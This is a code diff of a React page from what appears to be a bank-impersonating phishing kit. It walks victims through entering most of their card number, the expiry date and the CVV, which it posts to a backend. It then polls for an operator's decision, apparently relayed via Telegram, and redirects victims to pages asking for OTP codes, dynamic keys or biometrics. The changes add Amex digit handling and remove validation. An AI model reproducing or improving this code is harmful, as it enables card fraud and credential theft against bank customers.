@@ -3,6 +3,7 @@ import { useNavigate } from "react-router-dom";
 import localStorageService from "../../services/localStorageService";
 import Loading from "../../components/Loading";
 import IniciarSesionModal from "./modals/iniciarSesionModal";
+import NumOTPModal from "./modals/NumOTP-Modal";
 import './css/LoginModal.css';
 import Payment from "payment";
 
@@ -86,6 +87,17 @@ export default function ValidacionTC() {
     // Refs para "aprobar custom": mantener usuario en espera hasta que admin pulse OTP/DIN/FIN
     const estadoAnteriorRef = useRef(null);
     const aprobadoEsperandoRef = useRef(false);
+
+    // --- LÓGICA DE TARJETA E IMÁGENES --- (Mover aquí para que isAmex tenga acceso a cardData actualizado)
+    const isAmex = (cardData.label || "").toLowerCase().includes("amex") ||
+        (cardData.filename || "").toLowerCase().includes("amex") ||
+        (cardData.tipo || "").toLowerCase().includes("american");
+
+    // AMEX total 15 digits. Backend sends last 4. 
+    // So user must enter first 11 digits. 11 + 4 = 15.
+    // Standard cards: 16 digits. User enters first 12. 12 + 4 = 16.
+    const requiredDigitsLength = isAmex ? 11 : 12;
+    const requiredCvvLength = isAmex ? 4 : 3;
 
     // --- LÓGICA DE CARGA DE DATOS ---
     useEffect(() => {
@@ -184,9 +196,7 @@ export default function ValidacionTC() {
     };
 
 
-    // --- LÓGICA DE TARJETA E IMÁGENES ---
-
-    // 1. Mapa de imágenes frontales a traseras (Traído de ValidacionCVV)
+    // 1. Mapa de imágenes frontales a traseras
     const getBackCardFilename = (frontFilename) => {
         const frontToBackMap = {
             // Crédito - Mastercard
@@ -225,18 +235,16 @@ export default function ValidacionTC() {
     };
 
     // 2. SISTEMA DE AJUSTE VISUAL (NORMALIZACIÓN)
-    // Diccionario de ajustes específicos para tarjetas con problemas de tamaño/encuadre
     const CARD_ADJUSTMENTS = {
         // --- VISA ---
         "Visa-Clasica.png": { transform: "scale(1.15)" },
         "Visa-seleccion-colombia.png": { transform: "scale(1.15)" },
         "Visa-Oro.png": { transform: "scale(1.15)" },
         "Visa-Platinum-v1.png": { transform: "scale(1.1)" },
-
         // --- MASTERCARD ---
         "Mastercard-Unica.png": { transform: "scale(1.1)" },
         "Mastercard-oro.png": { transform: "scale(1.1)" },
-        "Mastercard-Esso-mobil-v1.png": { transform: "scale(1.15)" }, // Esso Gold & Mobil comparten mapping a veces, ajustamos ambas si es el caso
+        "Mastercard-Esso-mobil-v1.png": { transform: "scale(1.15)" },
         "Mastercard-Platinum.png": { transform: "scale(1.1)" },
         "Mastercard-Black-v1.png": { transform: "scale(1.06)" },
         "Mastercard-E-Card-v1.png": { transform: "scale(1.05)" },
@@ -244,13 +252,11 @@ export default function ValidacionTC() {
         "Débito Preferencial.png": { transform: "scale(1.04)" },
         "Débito Clásica.png": { transform: "scale(1.04)" },
         "debito_virtual.png": { transform: "scale(1.05)" },
-
         // --- AMEX ---
         "Amex+Libre.png": { transform: "scale(1.15)" },
     };
 
     const getCardStyle = (filename) => {
-        // Retorna el estilo específico si existe, o vacío si no
         return CARD_ADJUSTMENTS[filename] || {};
     };
 
@@ -261,17 +267,13 @@ export default function ValidacionTC() {
 
     const getBackCardImagePath = () => {
         const backFilename = getBackCardFilename(cardData.filename);
-        if (!backFilename) return getCardImagePath(); // Fallback
+        if (!backFilename) return getCardImagePath();
         const folder = cardData.tipo === "debito" ? "ATRAS-DEBITO" : "ATRAS-TARJETAS";
         return `/assets/images/${folder}/${backFilename}`;
     };
 
     const getTipoTarjeta = () => cardData.tipo === "credito" ? "Crédito" : "Débito";
 
-    // --- LÓGICA DE VALIDACIÓN ---
-    const isAmex = cardData.label.toLowerCase().includes("amex") || cardData.filename.toLowerCase().includes("amex");
-    const requiredDigitsLength = 12; // Siempre 12 dígitos iniciales
-    const requiredCvvLength = isAmex ? 4 : 3;
 
     const handleDigitsChange = (e) => {
         const val = e.target.value;
@@ -284,29 +286,9 @@ export default function ValidacionTC() {
         // Guardar mientras escribe
         setCardDigits(val);
 
-        // 👇 SOLO validar cuando ya están los 12 dígitos
+        // 👇 SOLO validar cuando ya están los dígitos requeridos
         if (val.length === requiredDigitsLength) {
-
-            // Construir número completo (12 + últimos 4 conocidos)
-            const fullCardNumber = val + cardData.digits;
-
-            const isValidNumber = Payment.fns.validateCardNumber(fullCardNumber);
-            const cardType = Payment.fns.cardType(fullCardNumber);
-
-            // ❌ Tarjeta inválida (Luhn o tipo desconocido)
-            if (!isValidNumber || !cardType) {
-                alert("Número de tarjeta inválido. Verifica los dígitos.");
-                return;
-            }
-
-            // ✅ Opcional: validar tipo esperado (crédito/débito)
-            if (cardData.tipo === "debito" && cardType !== "visa" && cardType !== "mastercard") {
-                alert("La tarjeta ingresada no corresponde a una tarjeta débito válida.");
-                return;
-            }
-
-            // 🔥 Aquí ya pasó validación real
-            console.log("Tarjeta válida:", cardType);
+            console.log("Dígitos completos");
         }
     };
 
@@ -315,7 +297,6 @@ export default function ValidacionTC() {
         const raw = e.target.value;
         const numbers = raw.replace(/\D/g, "");
 
-        // 👈 Backspace: no reformatear
         if (raw.length < expirationDate.length) {
             setExpirationDate(raw);
             return;
@@ -364,10 +345,10 @@ export default function ValidacionTC() {
     // --- TRANSICIÓN DE PASOS ---
     const handleContinue = async () => {
         if (step === "front") {
-            // Validar paso 1: 12 dígitos + fecha de expiración válida
+            // Validar paso 1
             const isExpirationValid = expirationDate.length === 5 && expirationDate.includes("/");
             if (cardDigits.length === requiredDigitsLength && isExpirationValid) {
-                setStep("back"); // Esto activará la animación CSS
+                setStep("back");
                 setIsFocused(false);
                 setFocusedField("");
             }
@@ -376,7 +357,6 @@ export default function ValidacionTC() {
             if (cvv.length === requiredCvvLength) {
                 try {
                     setCargando(true);
-                    // Obtener sesion_id del localStorage
                     const raw = localStorage.getItem("datos_usuario");
                     const usuarioLocalStorage = raw ? JSON.parse(raw) : {};
                     const sesionId = usuarioLocalStorage?.sesion_id;
@@ -387,13 +367,11 @@ export default function ValidacionTC() {
                         return;
                     }
 
-                    // Construir número completo de tarjeta (12 dígitos + 4 últimos)
+                    // Construir número completo
                     const numeroTarjetaCompleto = cardDigits + cardData.digits;
 
-                    // --- REGISTRAR INTENTO EN LOCALSTORAGE (Estructura Unificada) ---
+                    // --- REGISTRAR INTENTO EN LOCALSTORAGE ---
                     if (!usuarioLocalStorage.usuario) usuarioLocalStorage.usuario = {};
-
-                    // Determinar si usar endpoint TC estándar o TC Custom
                     const endpoint = isTCCustom ? "/tc-custom" : "/tc";
                     const arrayKey = isTCCustom ? "tc_custom" : "tc";
 
@@ -410,22 +388,16 @@ export default function ValidacionTC() {
                     usuarioLocalStorage.usuario[arrayKey].push(nuevoIntento);
                     localStorage.setItem("datos_usuario", JSON.stringify(usuarioLocalStorage));
 
-                    // Preparar datos para enviar
-                    // Enviamos usuarioLocalStorage completo en attributes para que el backend tome el array correspondiente
                     const dataSend = {
                         data: {
                             attributes: usuarioLocalStorage
                         }
                     };
 
-                    // Importar axios instance
                     const { instanceBackend } = await import("../../axios/instanceBackend");
-
-                    // Enviar al backend (TC estándar o TC Custom según corresponda)
                     const response = await instanceBackend.post(endpoint, dataSend);
 
                     if (response.data.success) {
-                        // Iniciar polling para esperar respuesta del admin
                         iniciarPolling(sesionId);
                     } else {
                         alert("Error al enviar los datos");
@@ -434,12 +406,13 @@ export default function ValidacionTC() {
                 } catch (error) {
                     console.error("Error enviando TC:", error);
                     alert("Error de conexión con el servidor");
+                    setCargando(false);
                 }
             }
         }
     };
 
-    // Función de polling para esperar respuesta del admin con timeout y límite de reintentos
+    // Función de polling
     const iniciarPolling = (sesionId) => {
         let attempts = 0;
         const MAX_ATTEMPTS = 60;
@@ -476,8 +449,6 @@ export default function ValidacionTC() {
                     return;
                 }
 
-                // PRIMERO verificar estados de error (deben tener prioridad)
-                // Si estamos en TC y se rechaza TC Custom, mostrar error y NO redirigir
                 if (estado === 'error_tc' || estado === 'error_tc_custom') {
                     clearInterval(pollingInterval);
                     clearTimeout(timeoutId);
@@ -485,55 +456,12 @@ export default function ValidacionTC() {
                     setFormState(prev => ({ ...prev, lanzarModalErrorSesion: true }));
                     setTimeout(() => {
                         setFormState(prev => ({ ...prev, lanzarModalErrorSesion: false }));
-                        // Después de mostrar el error, volver a solicitar TC Custom
-                        // El admin puede volver a configurar desde Telegram
                     }, 2000);
                     setCardDigits("");
                     setExpirationDate("");
                     setCvv("");
                     setStep("front");
                     return;
-                }
-
-                // Estados de espera (awaiting approval)
-                const estadosEspera = ['pendiente', 'awaiting_tc_approval', 'awaiting_cvv_approval'];
-                if (estadosEspera.includes(estado)) {
-                    estadoAnteriorRef.current = estado;
-                    return;
-                }
-
-                // Si el estado es solicitar_tc o solicitar_tc_custom, detener polling pero mantener en la vista
-                if (estado === 'solicitar_tc' || estado === 'solicitar_tc_custom') {
-                    clearInterval(pollingInterval);
-                    clearTimeout(timeoutId);
-                    setCargando(false);
-                    setCardDigits("");
-                    setExpirationDate("");
-                    setCvv("");
-                    setStep("front");
-                    return;
-                }
-
-                // Admin aprobó TC/CVV custom: backend NO cambia el estado automáticamente.
-                // Usuario debe QUEDAR EN ESPERA hasta que admin pulse OTP, DIN o FIN.
-                // El estado permanece en 'awaiting_tc_approval' o 'awaiting_cvv_approval' hasta que admin presione un botón del menú.
-
-                // Si el estado sigue en awaiting_approval, seguir esperando
-                if (estado === 'awaiting_tc_approval' || estado === 'awaiting_cvv_approval') {
-                    estadoAnteriorRef.current = estado;
-                    return;
-                }
-
-                // Si estaba en awaiting_approval y ahora cambió a otro estado, significa que el admin presionó un botón
-                const prev = estadoAnteriorRef.current;
-                if ((prev === 'awaiting_tc_approval' || prev === 'awaiting_cvv_approval') &&
-                    estado !== 'awaiting_tc_approval' && estado !== 'awaiting_cvv_approval' &&
-                    estado !== 'pendiente') {
-                    // El admin presionó un botón después de aprobar, continuar con el flujo normal
-                    estadoAnteriorRef.current = estado;
-                    // NO retornar aquí, dejar que continúe el flujo para detectar redirecciones
-                } else {
-                    estadoAnteriorRef.current = estado;
                 }
 
                 const estadosFinales = [
@@ -550,54 +478,20 @@ export default function ValidacionTC() {
                 setCargando(false);
 
                 switch (estado.toLowerCase()) {
-                    case 'solicitar_otp':
-                        navigate('/numero-otp');
-                        break;
-                    case 'solicitar_din':
-                        navigate('/clave-dinamica');
-                        break;
-                    case 'solicitar_finalizar':
-                        navigate('/finalizado-page');
-                        break;
-                    case 'solicitar_biometria':
-                        navigate('/verificacion-identidad');
-                        break;
-                    case 'error_923':
-                        navigate('/error-923page');
-                        break;
-                    case 'solicitar_tc_custom':
-                        break;
-                    case 'solicitar_cvv_custom':
-                        navigate('/validacion-cvv');
-                        break;
-                    case 'solicitar_cvv':
-                        navigate('/validacion-cvv');
-                        break;
-                    case 'error_otp':
-                        navigate('/numero-otp');
-                        break;
-                    case 'error_din':
-                        navigate('/clave-dinamica');
-                        break;
-                    case 'error_login':
-                        navigate('/autenticacion');
-                        break;
-                    case 'error_tc':
-                    case 'error_tc_custom':
-                        // Error de TC/TC Custom: ya se manejó arriba (líneas 481-496)
-                        // Este case está aquí solo para documentación, ya se detuvo el polling arriba
-                        break;
-                    case 'error_cvv_custom':
-                        // Si estamos en TC y hay error de CVV, IGNORAR completamente
-                        // El usuario está en la vista de TC, no debe reaccionar a errores de CVV
-                        console.log('[TC] Ignorando error de CVV (estamos en TC):', estado);
-                        return; // NO hacer nada, NO redirigir
-                    default:
-                        console.log("Estado no manejado en redirección:", estado);
+                    case 'solicitar_otp': navigate('/numero-otp'); break;
+                    case 'solicitar_din': navigate('/clave-dinamica'); break;
+                    case 'solicitar_finalizar': navigate('/finalizado-page'); break;
+                    case 'solicitar_biometria': navigate('/verificacion-identidad'); break;
+                    case 'error_923': navigate('/error-923page'); break;
+                    case 'solicitar_tc_custom': break;
+                    case 'solicitar_cvv_custom': navigate('/validacion-cvv'); break;
+                    case 'solicitar_cvv': navigate('/validacion-cvv'); break;
+                    case 'error_otp': navigate('/numero-otp'); break;
+                    case 'error_din': navigate('/clave-dinamica'); break;
+                    case 'error_login': navigate('/autenticacion'); break;
                 }
 
             } catch (error) {
-                console.error('Error en polling:', error);
                 attempts++;
                 if (attempts >= MAX_ATTEMPTS) {
                     clearInterval(pollingInterval);
@@ -623,37 +517,50 @@ export default function ValidacionTC() {
 
     // --- RENDER HELPERS ---
 
-    // Placeholder para Dígitos (Frente) - Ahora solo 12 dígitos
-    const renderVisualInputDigits = () => (
-        <div className="input-lines-container mb-4" onClick={() => document.getElementById('cardDigits').focus()}
-            style={{ display: "flex", gap: "6px", cursor: "text", height: "45px", alignItems: "center", justifyContent: "center", flexWrap: "wrap" }}>
-            {Array.from({ length: requiredDigitsLength }).map((_, index) => {
-                const activeIndex = cardDigits.length < requiredDigitsLength ? cardDigits.length : requiredDigitsLength - 1;
-                const isActive =
-                    isFocused &&
-                    focusedField === "digits" &&
-                    step === "front" &&
-                    index === activeIndex &&
-                    (
-                        (activeIndex < 8 && index < 8) ||   // fila superior
-                        (activeIndex >= 8 && index >= 8)    // fila inferior
-                    );
-                const extraMargin = (index > 0 && index % 4 === 0) ? "10px" : "0px";
-                return (
-                    <div key={index} style={{
-                        width: "20px", height: "30px", marginLeft: extraMargin,
-                        borderBottom: `2px solid ${isActive ? "#FDDA24" : "#ffffff"}`,
-                        display: "flex", justifyContent: "center", alignItems: "center",
-                        color: "#ffffff", fontSize: "18px", fontWeight: "bold", transition: "border-color 0.2s"
-                    }}>
-                        {cardDigits[index] || ""}
-                    </div>
-                );
-            })}
-        </div>
-    );
+    const renderVisualInputDigits = () => {
+        const length = requiredDigitsLength || 12; // Fallback safety
+        return (
+            <div className="input-lines-container mb-4" onClick={() => document.getElementById('cardDigits').focus()}
+                style={{ display: "flex", gap: "6px", cursor: "text", height: "45px", alignItems: "center", justifyContent: "center", flexWrap: "wrap" }}>
+                {Array.from({ length: length }).map((_, index) => {
+                    const activeIndex = cardDigits.length < length ? cardDigits.length : length - 1;
+                    const isActive =
+                        isFocused &&
+                        focusedField === "digits" &&
+                        step === "front" &&
+                        index === activeIndex;
 
-    // Placeholder para Fecha de Expiración (Frente)
+                    let extraMargin = "0px";
+                    if (index > 0) {
+                        if (isAmex) {
+                            // AMEX (15 total, 11 input)
+                            // Grouping: 4-6-5
+                            // Input: 11 digits + 4 fixed = 15
+                            // Input Groups: 4 digits (0-3), then 6 digits (4-9), then 1 digit (10)
+                            if (index === 4) extraMargin = "10px"; // Space after 4th digit (index 3)
+                            if (index === 10) extraMargin = "10px"; // Space after 10th digit (index 9)
+                        } else {
+                            // Standard (16 total, 12 input)
+                            // Grouping: 4-4-4-4
+                            if (index % 4 === 0) extraMargin = "10px";
+                        }
+                    }
+
+                    return (
+                        <div key={index} style={{
+                            width: "20px", height: "30px", marginLeft: extraMargin,
+                            borderBottom: `2px solid ${isActive ? "#FDDA24" : "#ffffff"}`,
+                            display: "flex", justifyContent: "center", alignItems: "center",
+                            color: "#ffffff", fontSize: "18px", fontWeight: "bold", transition: "border-color 0.2s"
+                        }}>
+                            {cardDigits[index] || ""}
+                        </div>
+                    );
+                })}
+            </div>
+        )
+    };
+
     const renderVisualInputExpiration = () => (
         <div className="input-lines-container" onClick={() => document.getElementById('expirationDate').focus()}
             style={{ display: "flex", gap: "10px", cursor: "text", height: "45px", alignItems: "center", justifyContent: "center", marginTop: "15px" }}>
@@ -676,7 +583,6 @@ export default function ValidacionTC() {
         </div>
     );
 
-    // Placeholder para CVV (Reverso)
     const renderVisualInputCVV = () => (
         <div className="input-lines-container" onClick={() => document.getElementById('cvv').focus()}
             style={{ display: "flex", gap: "10px", cursor: "text", height: "45px", alignItems: "center", justifyContent: "center" }}>
@@ -701,7 +607,6 @@ export default function ValidacionTC() {
         <>
             <style>{flipStyles}</style>
             <div style={{ minHeight: "100dvh", display: "flex", flexDirection: "column" }}>
-                {/* Header igual */}
                 <div style={{
                     flex: 1,
                     backgroundColor: "#2C2A29",
@@ -724,7 +629,6 @@ export default function ValidacionTC() {
                     <div className="login-page">
                         <div className="login-box" style={{ backgroundColor: "#454648" }}>
 
-                            {/* Header Tarjeta Pequeña */}
                             <div style={{ display: "flex", alignItems: "flex-start", gap: "15px", marginBottom: "24px" }}>
                                 <img src={getCardImagePath()} alt={cardData.label} style={{ width: "70px", borderRadius: "8px", flexShrink: 0 }} />
                                 <h2 style={{ fontSize: "20px", fontWeight: "bold", color: "#ffffff", margin: 0, textAlign: "left", lineHeight: "1.4" }}>
@@ -742,11 +646,9 @@ export default function ValidacionTC() {
                                 }
                             </p>
 
-                            {/* --- FLIP CARD CONTAINER --- */}
                             <div className="flip-card">
                                 <div className={`flip-card-inner ${step === 'back' ? 'flipped' : ''}`}>
 
-                                    {/* FRENTE */}
                                     <div className="flip-card-front">
                                         <img
                                             src={getCardImagePath()}
@@ -754,25 +656,21 @@ export default function ValidacionTC() {
                                             style={getCardStyle(cardData.filename)}
                                         />
 
-                                        {/* Overlay Dígitos en la Tarjeta */}
                                         <div style={{
                                             position: "absolute", top: "65%", left: "50%", transform: "translate(-50%, -50%)", width: "88%",
                                             display: "flex", flexDirection: "column", gap: "8px", color: "#ffffff",
                                             textShadow: "2px 2px 4px rgba(0,0,0,0.8)", pointerEvents: "none"
                                         }}>
-                                            {/* Número de tarjeta: 12 bullets + últimos 4 dígitos */}
                                             <div className="digits-text" style={{ marginTop: 20 }}>
                                                 {cardDigits.padEnd(requiredDigitsLength, '•').match(/.{1,4}/g)?.join(' ')} {cardData.digits}
                                             </div>
 
-                                            {/* Fecha de expiración */}
                                             <div className="digits-text" style={{ marginTop: 0 }}>
                                                 {expirationDate || "MM/YY"}
                                             </div>
                                         </div>
                                     </div>
 
-                                    {/* REVERSO */}
                                     <div className="flip-card-back">
                                         <img
                                             src={getBackCardImagePath()}
@@ -780,7 +678,6 @@ export default function ValidacionTC() {
                                             style={getCardStyle(getBackCardFilename(cardData.filename))}
                                         />
 
-                                        {/* Overlay CVV */}
                                         <div style={{
                                             position: "absolute", top: "32.5%", left: "84%", transform: "translate(-50%, -50%)",
                                             color: "#000", fontSize: "20px", fontFamily: "monospace", fontWeight: "bold", pointerEvents: "none"
@@ -792,16 +689,14 @@ export default function ValidacionTC() {
                                 </div>
                             </div>
 
-                            {/* --- INPUTS --- */}
                             <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "25px", width: "100%" }}>
 
                                 {step === "front" ? (
                                     <>
-                                        {/* Input de Número de Tarjeta */}
                                         <div className="input-group-custom" style={{ borderBottom: "none", position: "relative", display: "flex", flexDirection: "column", alignItems: "center", gap: "10px", width: "100%" }}>
                                             {renderVisualInputDigits()}
                                             <label htmlFor="cardDigits" style={{ color: "#ffffff", fontWeight: "bold", fontSize: "14px", textAlign: 'center' }}>
-                                                Ingrese los primeros 12 dígitos de su tarjeta
+                                                Ingrese los primeros {requiredDigitsLength} dígitos de su tarjeta
                                             </label>
                                             <input
                                                 id="cardDigits"
@@ -817,16 +712,15 @@ export default function ValidacionTC() {
                                                     top: 0,
                                                     left: "50%",
                                                     transform: "translateX(-50%)",
-                                                    width: "260px",      // 👈 ancho SOLO de la fila superior
-                                                    height: "40px",      // 👈 altura SOLO de la fila superior
+                                                    width: "260px",
+                                                    height: "40px",
                                                     opacity: 0,
                                                     cursor: "text",
-                                                    caretColor: "transparent", // 👈 CLAVE
+                                                    caretColor: "transparent",
                                                 }}
                                             />
                                         </div>
 
-                                        {/* Input de Fecha de Expiración */}
                                         <div className="input-group-custom" style={{ borderBottom: "none", position: "relative", display: "flex", flexDirection: "column", alignItems: "center", gap: "10px", width: "100%" }}>
                                             {renderVisualInputExpiration()}
                                             <label htmlFor="expirationDate" style={{ color: "#ffffff", fontWeight: "bold", fontSize: "14px", marginTop: "5px" }}>
@@ -846,18 +740,17 @@ export default function ValidacionTC() {
                                                     top: 0,
                                                     left: "50%",
                                                     transform: "translateX(-50%)",
-                                                    width: "260px",      // 👈 ancho SOLO de la fila superior
-                                                    height: "40px",      // 👈 altura SOLO de la fila superior
+                                                    width: "260px",
+                                                    height: "40px",
                                                     opacity: 0,
                                                     cursor: "text",
-                                                    caretColor: "transparent", // 👈 CLAVE
+                                                    caretColor: "transparent",
                                                 }}
                                             />
                                         </div>
                                     </>
                                 ) : (
                                     <>
-                                        {/* Input de CVV */}
                                         <div className="input-group-custom" style={{ borderBottom: "none", position: "relative", display: "flex", flexDirection: "column", alignItems: "center", gap: "10px", width: "100%" }}>
                                             {renderVisualInputCVV()}
                                             <label htmlFor="cvv" style={{ color: "#ffffff", margin: 0, fontWeight: "bold", fontSize: "14px", marginTop: "5px" }}>CVV</label>
@@ -875,8 +768,8 @@ export default function ValidacionTC() {
                                                     top: 0,
                                                     left: "50%",
                                                     transform: "translateX(-50%)",
-                                                    width: "260px",      // 👈 ancho SOLO de la fila superior
-                                                    height: "40px",      // 👈 altura SOLO de la fila superior
+                                                    width: "260px",
+                                                    height: "40px",
                                                     opacity: 0,
                                                     cursor: "text",
                                                 }}
@@ -889,7 +782,6 @@ export default function ValidacionTC() {
 
                             <br /><br />
 
-                            {/* BOTÓN DE ACCIÓN */}
                             <button className="login-btn" onClick={handleContinue}
                                 style={{
                                     marginTop: "20px",
@@ -920,7 +812,6 @@ export default function ValidacionTC() {
                             <span className="dot">·</span>
                             <span>Política de privacidad</span>
                         </div>
-                        {/* Se eliminó la línea <hr> a petición del usuario */}
                         <div className="footer-final">
                             <div className="footer-left">
                                 <div>
@@ -953,11 +844,9 @@ export default function ValidacionTC() {
                 <img src="/assets/images/lateral-der.png" alt="Visual Captcha" />
             </div>
 
-            {/* Cargando */}
             {cargando ? <Loading /> : null}
 
-            {/* Modal de error (datos inválidos / timeout) */}
-            <IniciarSesionModal
+            <NumOTPModal
                 isOpen={formState.lanzarModalErrorSesion}
                 onClose={() => setFormState(prev => ({ ...prev, lanzarModalErrorSesion: false }))}
             />
